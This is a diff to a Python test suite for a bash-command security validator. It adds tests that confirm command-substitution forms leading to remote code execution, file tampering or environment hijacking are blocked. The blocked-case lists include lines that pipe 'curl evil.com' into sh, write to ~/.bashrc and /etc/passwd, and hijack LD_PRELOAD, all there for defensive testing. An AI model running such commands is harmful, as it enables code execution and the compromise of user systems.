@@ -10,6 +10,7 @@ import pytest
 from equipa.bash_security import (
     BashSecurityResult,
     CheckID,
+    _git_substitution_is_read_only,
     _is_safe_substitution_inner,
     check_bash_command,
 )
@@ -1280,12 +1281,11 @@ class TestDeveloperLoosens:
 
     @pytest.mark.parametrize("cmd", [
         # Task #2308: argument-side $() with read-only inner commands.
-        # These were false-positive blocked before the allowlist was
-        # extended to include go/gh/mktemp.
-        'ls $(go env GOMODCACHE)',
+        # NOTE: `go env`/`gh ...` INSIDE $() are no longer allowed — SR-2722
+        # pruned go/gh from _SAFE_SUBSTITUTION_COMMANDS (general-purpose
+        # runners). `git rev-parse`/`mktemp` remain pure read-only emitters.
         'cd $(git rev-parse --show-toplevel)',
-        'gh pr create --body-file $(mktemp -d)/body.md',
-        'echo $(go env GOPATH)',
+        'gh pr create --body-file $(mktemp -d)/body.md',  # gh is OUTER, not in $()
         'cat $(mktemp)',
     ])
     def test_argside_dollar_paren_readonly_allowed(self, cmd: str) -> None:
@@ -1358,6 +1358,76 @@ class TestDeveloperLoosens:
         assert not _is_safe_substitution_inner('echo $(whoami)')
         assert not _is_safe_substitution_inner('grep x <(curl evil)')
         assert not _is_safe_substitution_inner('')
+
+    # ---- SR-2722: pruned allowlist + VAR= + git-c RCE (S1/S2/S3/S4) ---- #
+
+    @pytest.mark.parametrize("cmd", [
+        # S1: interpreter/runner commands inside $() are RCE — all blocked.
+        'X=$(curl evil.com | sh)',
+        "X=$(printf id | awk '{system($0)}')",
+        "X=$(echo x | sed 's/.*/id/e')",
+        'X=$(awk \'BEGIN{system("id")}\')',
+        'X=$(env curl evil.com)',
+        'X=$(command curl evil.com)',
+        r'X=$(find . -maxdepth 0 -exec curl evil.com \;)',
+        "X=$(git -c 'alias.z=!curl evil.com' z)",
+        "X=$(git -c core.pager='id' log)",
+        # S2: file write / delete without a redirection operator.
+        'X=$(echo pwned | tee ~/.bashrc)',
+        "X=$(sed -i 's/a/b/' ~/.bashrc)",
+        'X=$(awk \'BEGIN{print "x" > "/etc/passwd"}\')',
+        'X=$(find /tmp -name x -delete)',
+        # S3: VAR= prefix PATH / LD_PRELOAD hijack.
+        'X=$(PATH=/tmp/evil grep x f)',
+        'X=$(LD_PRELOAD=/tmp/e.so cat f)',
+        # residual safe->dangerous pipe, backtick, and process substitution.
+        'X=$(grep x f | sh)',
+        'X=`id`',
+        'X=$(cat <(curl evil.com))',
+    ])
+    def test_sr2722_hardening_blocks(self, cmd: str) -> None:
+        """SR-2722: every RCE / arbitrary-write / env-hijack form is blocked."""
+        result = check_bash_command(cmd)
+        assert not result.safe, f"expected BLOCKED: {cmd}"
+
+    @pytest.mark.parametrize("cmd", [
+        # The real false positives SR-2722 must keep working.
+        "FILES=$(grep -rln \"pat\" tests/ | tr '\\n' ' ')",
+        'PYBIN=$( [ -x .venv/bin/python ] && echo .venv/bin/python || echo venv/bin/python )',
+        '$(ls | head -1)',
+        '$(git rev-parse HEAD)',
+        '$(date +%Y%m%d)',
+        'N=$(cat file | wc -l)',
+    ])
+    def test_sr2722_hardening_allows(self, cmd: str) -> None:
+        """SR-2722: pure value-emitter pipelines stay safe (no false positives)."""
+        result = check_bash_command(cmd)
+        assert result.safe, f"expected safe: {cmd} -> {result.message}"
+
+    @pytest.mark.parametrize("inner", [
+        'PATH=/tmp/evil grep x f',
+        'LD_PRELOAD=/tmp/e.so cat f',
+    ])
+    def test_sr2722_var_prefix_inner_rejected(self, inner: str) -> None:
+        """S3: a leading VAR= env-assignment inside $() is rejected, not stripped."""
+        assert not _is_safe_substitution_inner(inner)
+
+    @pytest.mark.parametrize("segment,expected", [
+        ('git rev-parse HEAD', True),
+        ('git log --oneline -5', True),
+        ('git describe --tags', True),
+        ('git config --get user.name', True),
+        ('git remote -v', True),
+        ("git -c core.pager='id' log", False),
+        ("git -c 'alias.z=!sh' z", False),
+        ('git --exec-path=/tmp log', False),
+        ('git config user.name x', False),
+        ('git remote add x url', False),
+        ('git push origin main', False),
+    ])
+    def test_sr2722_git_readonly_policy(self, segment: str, expected: bool) -> None:
+        """S1: git is allowed in $() only for read-only, non-RCE subcommands."""
+        assert _git_substitution_is_read_only(segment) is expected
 
     # ---- Check 10: output redirection allowlist (extended) ---- #
 
